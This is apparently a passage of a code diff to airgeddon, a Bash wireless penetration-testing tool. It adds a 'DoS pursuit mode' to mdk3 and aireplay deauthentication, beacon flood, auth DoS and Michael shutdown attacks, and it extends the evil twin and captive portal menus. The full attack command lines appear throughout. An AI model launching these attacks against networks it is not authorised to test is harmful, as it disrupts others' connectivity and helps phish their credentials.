-	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk3 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 506 "yellow"
+		language_strings "${language}" 4 "read"
+
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "beacon flood attack" "first_time"
+		pid_control_pursuit_mode "beacon flood attack"
+	else
+		language_strings "${language}" 33 "yellow"
+		language_strings "${language}" 4 "read"
+		recalculate_windows_sizes
+		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk3 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
+	fi
 }
 
 #Execute Auth DoS attack
@@ -2790,11 +3075,22 @@ function exec_authdos() {
 	language_strings "${language}" 93 "title"
 	language_strings "${language}" 32 "green"
 
+	tmpfiles_toclean=1
+
 	echo
-	language_strings "${language}" 33 "yellow"
-	language_strings "${language}" 4 "read"
-	recalculate_windows_sizes
-	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk3 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 506 "yellow"
+		language_strings "${language}" 4 "read"
+
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "auth dos attack" "first_time"
+		pid_control_pursuit_mode "auth dos attack"
+	else
+		language_strings "${language}" 33 "yellow"
+		language_strings "${language}" 4 "read"
+		recalculate_windows_sizes
+		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk3 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
+	fi
 }
 
 #Execute Michael Shutdown DoS attack
@@ -2806,11 +3102,22 @@ function exec_michaelshutdown() {
 	language_strings "${language}" 94 "title"
 	language_strings "${language}" 32 "green"
 
+	tmpfiles_toclean=1
+
 	echo
-	language_strings "${language}" 33 "yellow"
-	language_strings "${language}" 4 "read"
-	recalculate_windows_sizes
-	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 506 "yellow"
+		language_strings "${language}" 4 "read"
+
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "michael shutdown attack" "first_time"
+		pid_control_pursuit_mode "michael shutdown attack"
+	else
+		language_strings "${language}" 33 "yellow"
+		language_strings "${language}" 4 "read"
+		recalculate_windows_sizes
+		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
+	fi
 }
 
 #Validate Mdk3 parameters
@@ -2822,7 +3129,10 @@ function mdk3_deauth_option() {
 	language_strings "${language}" 95 "title"
 	language_strings "${language}" 35 "green"
 
-	if ! check_monitor_enabled; then
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
 		return
 	fi
 
@@ -2833,6 +3143,12 @@ function mdk3_deauth_option() {
 		return
 	fi
 	ask_channel
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+	fi
+
 	exec_mdk3deauth
 }
 
@@ -2845,7 +3161,10 @@ function aireplay_deauth_option() {
 	language_strings "${language}" 96 "title"
 	language_strings "${language}" 36 "green"
 
-	if ! check_monitor_enabled; then
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
 		return
 	fi
 
@@ -2856,6 +3175,12 @@ function aireplay_deauth_option() {
 		return
 	fi
 	ask_channel
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+	fi
+
 	exec_aireplaydeauth
 }
 
@@ -2868,7 +3193,10 @@ function wds_confusion_option() {
 	language_strings "${language}" 97 "title"
 	language_strings "${language}" 37 "green"
 
-	if ! check_monitor_enabled; then
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
 		return
 	fi
 
@@ -2879,6 +3207,15 @@ function wds_confusion_option() {
 		return
 	fi
 	ask_channel
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+		echo
+		language_strings "${language}" 508 "yellow"
+		language_strings "${language}" 115 "read"
+	fi
+
 	exec_wdsconfusion
 }
 
@@ -2891,7 +3228,10 @@ function beacon_flood_option() {
 	language_strings "${language}" 98 "title"
 	language_strings "${language}" 38 "green"
 
-	if ! check_monitor_enabled; then
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
 		return
 	fi
 
@@ -2902,6 +3242,12 @@ function beacon_flood_option() {
 		return
 	fi
 	ask_channel
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+	fi
+
 	exec_beaconflood
 }
 
@@ -2914,7 +3260,10 @@ function auth_dos_option() {
 	language_strings "${language}" 99 "title"
 	language_strings "${language}" 39 "green"
 
-	if ! check_monitor_enabled; then
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
 		return
 	fi
 
@@ -2924,6 +3273,15 @@ function auth_dos_option() {
 	if ! ask_bssid; then
 		return
 	fi
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+		echo
+		language_strings "${language}" 508 "yellow"
+		language_strings "${language}" 115 "read"
+	fi
+
 	exec_authdos
 }
 
@@ -2936,7 +3294,10 @@ function michael_shutdown_option() {
 	language_strings "${language}" 100 "title"
 	language_strings "${language}" 40 "green"
 
-	if ! check_monitor_enabled; then
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
 		return
 	fi
 
@@ -2946,6 +3307,12 @@ function michael_shutdown_option() {
 	if ! ask_bssid; then
 		return
 	fi
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+	fi
+
 	exec_michaelshutdown
 }
 
@@ -2963,7 +3330,10 @@ function wep_option() {
 		fi
 	fi
 
-	if ! check_monitor_enabled; then
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
 		return 1
 	fi
 
@@ -2987,7 +3357,10 @@ function wps_attacks_parameters() {
 	debug_print
 
 	if [ "${1}" != "no_monitor_check" ]; then
-		if ! check_monitor_enabled; then
+		if ! check_monitor_enabled "${interface}"; then
+			echo
+			language_strings "${language}" 14 "red"
+			language_strings "${language}" 115 "read"
 			return 1
 		fi
 
@@ -3053,7 +3426,7 @@ function print_iface_selected() {
 		language_strings "${language}" 115 "read"
 		select_interface
 	else
-		check_interface_mode
+		check_interface_mode "${interface}"
 		language_strings "${language}" 42 "blue"
 	fi
 }
@@ -3303,6 +3676,7 @@ function initialize_menu_and_print_selections() {
 			print_all_target_vars
 		;;
 		"dos_attacks_menu")
+			dos_pursuit_mode=0
 			print_iface_selected
 			print_all_target_vars
 		;;
@@ -3322,10 +3696,12 @@ function initialize_menu_and_print_selections() {
 			captive_portal_mode="internet"
 			et_mode=""
 			et_processes=()
+			secondary_wifi_interface=""
 			print_iface_selected
 			print_all_target_vars_et
 		;;
 		"et_dos_menu")
+			dos_pursuit_mode=0
 			if [ ${retry_handshake_capture} -eq 1 ]; then
 				retry_handshake_capture=0
 				retrying_handshake_capture=1
@@ -3395,6 +3771,8 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
 	rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
+	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
 }
 
 #Manage cleaning firewall rules and restore orginal routing state
@@ -3411,6 +3789,8 @@ function clean_routing_rules() {
 	else
 		clean_iptables
 	fi
+
+	rm -rf "${tmpdir}ag.iptables" > /dev/null 2>&1
 }
 
 #Save iptables rules
@@ -3605,10 +3985,10 @@ function main_menu() {
 			select_interface
 		;;
 		2)
-			monitor_option
+			monitor_option "${interface}"
 		;;
 		3)
-			managed_option
+			managed_option "${interface}"
 		;;
 		4)
 			dos_attacks_menu
@@ -3679,10 +4059,10 @@ function evil_twin_attacks_menu() {
 			select_interface
 		;;
 		2)
-			monitor_option
+			monitor_option "${interface}"
 		;;
 		3)
-			managed_option
+			managed_option "${interface}"
 		;;
 		4)
 			explore_for_targets_option
@@ -3691,7 +4071,7 @@ function evil_twin_attacks_menu() {
 			if contains_element "${et_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				if check_interface_wifi; then
+				if check_interface_wifi "${interface}"; then
 					et_mode="et_onlyap"
 					et_dos_menu
 				else
@@ -3705,7 +4085,7 @@ function evil_twin_attacks_menu() {
 			if contains_element "${et_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				if check_interface_wifi; then
+				if check_interface_wifi "${interface}"; then
 					et_mode="et_sniffing"
 					et_dos_menu
 				else
@@ -3719,7 +4099,7 @@ function evil_twin_attacks_menu() {
 			if contains_element "${et_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				if check_interface_wifi; then
+				if check_interface_wifi "${interface}"; then
 					et_mode="et_sniffing_sslstrip"
 					et_dos_menu
 				else
@@ -3736,7 +4116,7 @@ function evil_twin_attacks_menu() {
 			if contains_element "${et_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				if check_interface_wifi; then
+				if check_interface_wifi "${interface}"; then
 					et_mode="et_captive_portal"
 					echo
 					language_strings "${language}" 316 "yellow"
@@ -3805,7 +4185,7 @@ function beef_pre_menu() {
 			if contains_element "${beef_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				if check_interface_wifi; then
+				if check_interface_wifi "${interface}"; then
 					et_mode="et_sniffing_sslstrip2"
 					get_bettercap_version
 					et_dos_menu
@@ -3873,10 +4253,10 @@ function wps_attacks_menu() {
 			select_interface
 		;;
 		2)
-			monitor_option
+			monitor_option "${interface}"
 		;;
 		3)
-			managed_option
+			managed_option "${interface}"
 		;;
 		4)
 			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
@@ -4076,10 +4456,10 @@ function offline_pin_generation_menu() {
 			select_interface
 		;;
 		2)
-			monitor_option
+			monitor_option "${interface}"
 		;;
 		3)
-			managed_option
+			managed_option "${interface}"
 		;;
 		4)
 			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
@@ -4160,43 +4540,48 @@ function offline_pin_generation_menu() {
 					ask_yesno 504 "yes"
 					if [ "${yesno}" = "y" ]; then
 
-						if check_monitor_enabled; then
-							able_to_check_json_option_on_wash=0
+						if check_monitor_enabled "${interface}"; then
 							if hash wash 2> /dev/null; then
-								able_to_check_json_option_on_wash=1
-								if [ "${able_to_check_json_option_on_wash}" -eq 1 ]; then
-									if check_json_option_on_wash; then
+								if check_json_option_on_wash; then
 
-										echo
-										language_strings "${language}" 489 "blue"
+									echo
+									language_strings "${language}" 489 "blue"
 
-										serial=""
-										wash_json_scan "${wps_bssid}"
-										if [ -n "${serial}" ]; then
-											if [[ "${serial}" =~ ^[0-9]{4}$ ]]; then
-												set_wps_mac_parameters
-												calculate_arcadyan_algorithm
-												pin_checksum_rule "${arcadyan_pin}"
-												arcadyan_pin="${arcadyan_pin}${checksum_digit}"
-												fill_wps_data_array "${wps_bssid}" "Arcadyan" "${arcadyan_pin}"
-												offline_arcadyan_pin_can_be_shown=1
-											else
-												echo
-												language_strings "${language}" 491 "yellow"
-											fi
-											echo
+									serial=""
+									wash_json_scan "${wps_bssid}"
+									if [ -n "${serial}" ]; then
+										if [[ "${serial}" =~ ^[0-9]{4}$ ]]; then
+											set_wps_mac_parameters
+											calculate_arcadyan_algorithm
+											pin_checksum_rule "${arcadyan_pin}"
+											arcadyan_pin="${arcadyan_pin}${checksum_digit}"
+											fill_wps_data_array "${wps_bssid}" "Arcadyan" "${arcadyan_pin}"
+											offline_arcadyan_pin_can_be_shown=1
 										else
 											echo
-											language_strings "${language}" 488 "red"
+											language_strings "${language}" 491 "yellow"
 											language_strings "${language}" 115 "read"
 										fi
+										echo
+									else
+										echo
+										language_strings "${language}" 488 "red"
+										language_strings "${language}" 115 "read"
 									fi
+								else
+									echo
+									language_strings "${language}" 486 "red"
+									language_strings "${language}" 115 "read"
 								fi
 							else
 								echo
-								language_strings "${language}" 486 "red"
+								language_strings "${language}" 492 "red"
 								language_strings "${language}" 115 "read"
 							fi
+						else
+							echo
+							language_strings "${language}" 14 "red"
+							language_strings "${language}" 115 "read"
 						fi
 					fi
 				else
@@ -4254,10 +4639,10 @@ function wep_attacks_menu() {
 			select_interface
 		;;
 		2)
-			monitor_option
+			monitor_option "${interface}"
 		;;
 		3)
-			managed_option
+			managed_option "${interface}"
 		;;
 		4)
 			explore_for_targets_option
@@ -4950,6 +5335,8 @@ function set_captive_portal_language() {
 	language_strings "${language}" 249
 	language_strings "${language}" 308
 	language_strings "${language}" 320
+	language_strings "${language}" 482
+	language_strings "${language}" 58
 	print_hint ${current_menu}
 
 	read -r captive_portal_language_selected
@@ -4975,6 +5362,12 @@ function set_captive_portal_language() {
 		;;
 		7)
 			captive_portal_language="GREEK"
+		;;
+		8)
+			captive_portal_language="ITALIAN"
+		;;
+		9)
+			captive_portal_language="POLISH"
 		;;
 		*)
 			invalid_captive_portal_language_selected
@@ -5217,6 +5610,9 @@ function exec_et_onlyap_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		recover_current_channel
+	fi
 	restore_et_interface
 	clean_tmpfiles
 }
@@ -5241,6 +5637,9 @@ function exec_et_sniffing_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		recover_current_channel
+	fi
 	restore_et_interface
 	if [ ${ettercap_log} -eq 1 ]; then
 		parse_ettercap_log
@@ -5269,6 +5668,9 @@ function exec_et_sniffing_sslstrip_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		recover_current_channel
+	fi
 	restore_et_interface
 	if [ ${ettercap_log} -eq 1 ]; then
 		parse_ettercap_log
@@ -5306,6 +5708,9 @@ function exec_et_sniffing_sslstrip2_attack() {
 
 	kill_beef
 	kill_et_windows
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		recover_current_channel
+	fi
 	restore_et_interface
 
 	if [ ${bettercap_log} -eq 1 ]; then
@@ -5340,6 +5745,9 @@ function exec_et_captive_portal_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		recover_current_channel
+	fi
 	restore_et_interface
 	clean_tmpfiles
 }
@@ -5621,9 +6029,16 @@ function exec_et_deauth() {
 			deauth_scr_window_position=${g4_bottomleft_window}
 		;;
 	esac
-	xterm -hold -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "${deauth_et_cmd}" > /dev/null 2>&1 &
-	et_processes+=($!)
-	sleep 1
+
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "${et_dos_attack}" "first_time"
+		pid_control_pursuit_mode "${et_dos_attack}" "evil_twin" &
+	else
+		xterm -hold -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "${deauth_et_cmd}" > /dev/null 2>&1 &
+		et_processes+=($!)
+		sleep 1
+	fi
 }
 
 #Create here-doc bash script used for wps pin attacks
@@ -6959,10 +7374,46 @@ function kill_et_windows() {
 
 	debug_print
 
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		kill_dos_pursuit_mode_processes
+		case ${et_dos_attack} in
+			"Mdk3"|"Wds Confusion")
+				killall mdk3 > /dev/null 2>&1
+			;;
+			"Aireplay")
+				killall aireplay-ng > /dev/null 2>&1
+			;;
+		esac
+	fi
+
 	for item in "${et_processes[@]}"; do
 		kill "${item}" &> /dev/null
 	done
 	kill ${et_process_control_window} &> /dev/null
+	killall hostapd > /dev/null 2>&1
+}
+
+#Kill DoS pursuit mode processes
+function kill_dos_pursuit_mode_processes() {
+
+	debug_print
+
+	for item in "${dos_pursuit_mode_pids[@]}"; do
+		kill -9 "${item}" &> /dev/null
+		wait "${item}" 2>/dev/null
+	done
+}
+
+#Set current channel reading it from file
+function recover_current_channel() {
+
+	debug_print
+
+	local recovered_channel
+	recovered_channel=$(cat "${tmpdir}${channelfile}" 2> /dev/null)
+	if [ -n "${recovered_channel}" ]; then
+		channel="${recovered_channel}"
+	fi
 }
 
 #Convert capture file to hashcat format
@@ -7033,10 +7484,10 @@ function handshake_tools_menu() {
 			select_interface
 		;;
 		2)
-			monitor_option
+			monitor_option "${interface}"
 		;;
 		3)
-			managed_option
+			managed_option "${interface}"
 		;;
 		4)
 			explore_for_targets_option
@@ -7142,10 +7593,10 @@ function dos_attacks_menu() {
 			select_interface
 		;;
 		2)
-			monitor_option
+			monitor_option "${interface}"
 		;;
 		3)
-			managed_option
+			managed_option "${interface}"
 		;;
 		4)
 			explore_for_targets_option
@@ -7284,7 +7735,10 @@ function capture_handshake() {
 		fi
 	fi
 
-	if ! check_monitor_enabled; then
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
 		return 1
 	fi
 
@@ -7636,7 +8090,10 @@ function explore_for_targets_option() {
 	language_strings "${language}" 103 "title"
 	language_strings "${language}" 65 "green"
 
-	if ! check_monitor_enabled; then
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
 		return 1
 	fi
 
@@ -7711,7 +8168,10 @@ function explore_for_wps_targets_option() {
 	language_strings "${language}" 103 "title"
 	language_strings "${language}" 65 "green"
 
-	if ! check_monitor_enabled; then
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
 		return 1
 	fi
 
@@ -8092,6 +8552,9 @@ function et_prerequisites() {
 	print_iface_selected
 	print_et_target_vars
 	print_iface_internet_selected
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 512 "blue"
+	fi
 	print_hint ${current_menu}
 	echo
 
@@ -8280,6 +8743,12 @@ function et_dos_menu() {
 				forbidden_menu_option
 			else
 				et_dos_attack="Mdk3"
+
+				echo
+				language_strings "${language}" 509 "yellow"
+
+				dos_pursuit_mode_et_handler
+
 				if [ "${et_mode}" = "et_captive_portal" ]; then
 					if [ ${internet_interface_selected} -eq 0 ]; then
 						language_strings "${language}" 330 "blue"
@@ -8323,6 +8792,12 @@ function et_dos_menu() {
 				forbidden_menu_option
 			else
 				et_dos_attack="Aireplay"
+
+				echo
+				language_strings "${language}" 509 "yellow"
+
+				dos_pursuit_mode_et_handler
+
 				if [ "${et_mode}" = "et_captive_portal" ]; then
 					if [ ${internet_interface_selected} -eq 0 ]; then
 						language_strings "${language}" 330 "blue"
@@ -8366,6 +8841,12 @@ function et_dos_menu() {
 				forbidden_menu_option
 			else
 				et_dos_attack="Wds Confusion"
+
+				echo
+				language_strings "${language}" 509 "yellow"
+
+				dos_pursuit_mode_et_handler
+
 				if [ "${et_mode}" = "et_captive_portal" ]; then
 					if [ ${internet_interface_selected} -eq 0 ]; then
 						language_strings "${language}" 330 "blue"
@@ -8430,12 +8911,12 @@ function detect_internet_interface() {
 		language_strings "${language}" 285 "blue"
 		ask_yesno 284 "yes"
 		if [ "${yesno}" = "n" ]; then
-			if ! select_internet_interface; then
+			if ! select_secondary_et_interface "internet"; then
 				return 1
 			fi
 		fi
 	else
-		if ! select_internet_interface; then
+		if ! select_secondary_et_interface "internet"; then
 			return 1
 		fi
 	fi
@@ -8530,8 +9011,8 @@ function invalid_iface_selected() {
 	select_interface
 }
 
-#Show message for invalid selected internet interface
-function invalid_internet_iface_selected() {
+#Show message for invalid selected secondary interface
+function invalid_secondary_iface_selected() {
 
 	debug_print
 
@@ -8540,7 +9021,7 @@ function invalid_internet_iface_selected() {
 	echo
 	language_strings "${language}" 115 "read"
 	echo
-	select_internet_interface
+	select_secondary_et_interface "${1}"
 }
 
 #Manage behavior of captured traps
@@ -9574,14 +10055,16 @@ function initialize_script_settings() {
 	declare -gA wps_data_array
 }
 
-#Detect if there is a working X window system
+#Detect if there is a working X window system excepting for docker container
 function check_xwindow_system() {
 
 	debug_print
 
 	if hash xset 2> /dev/null; then
 		if ! xset -q > /dev/null 2>&1; then
-			xterm_ok=0
+			if [ "${is_docker}" -eq 0 ]; then
+				xterm_ok=0
+			fi
 		fi
 	fi
 }
